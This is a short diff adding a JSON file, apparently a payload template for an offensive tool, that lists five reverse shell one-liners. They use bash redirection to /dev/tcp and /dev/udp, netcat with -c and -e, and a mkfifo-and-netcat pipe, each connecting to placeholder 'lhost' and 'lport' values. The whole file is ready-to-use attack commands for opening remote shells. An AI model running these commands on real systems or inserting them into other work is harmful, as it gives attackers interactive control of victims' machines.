@@ -1,0 +1,24 @@
+{
+    "reverse_shell_list": [
+        {
+            "id":"1",
+            "object":"bash -i >& /dev/tcp/lhost/lport 0>&1"
+        },
+        {
+            "id":"2",
+            "object":"bash -i >& /dev/udp/lhost/lport 0>&1"
+        },
+        {
+            "id":"3",
+            "object":"nc -c /bin/bash lhost lport"
+        },
+        {
+            "id":"4",
+            "object":"nc -e /bin/bash lhost lport"
+        },
+        {
+            "id":"5",
+            "object":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc lhost lport >/tmp/f"
+        }
+    ]
+}
